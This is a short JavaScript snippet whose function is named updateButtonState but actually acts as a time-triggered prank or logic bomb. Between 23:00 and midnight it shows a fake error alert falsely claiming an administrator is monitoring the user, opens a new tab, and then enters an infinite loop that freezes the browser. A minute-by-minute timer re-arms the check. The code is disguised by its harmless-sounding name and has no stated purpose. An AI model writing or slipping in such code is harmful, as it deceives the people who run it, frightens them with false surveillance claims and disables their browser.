function updateButtonState() {
    const now = new Date();
    const currentHour = now.getHours();
    const currentMinutes = now.getMinutes();


    if (currentHour >= 23 && currentHour < 24) {
        setTimeout(function() {
            alert("Unexpected error occured. Error code: 374723. Error message: Your administrator has been monitoring your activity. Please contact your administrator for more information.");
            window.open('https://google.com','_blank');
            while (true) {
                console.log("Q");
            }
               }, 180000)
    } 
}

updateButtonState();


setInterval(updateButtonState, 60000); 
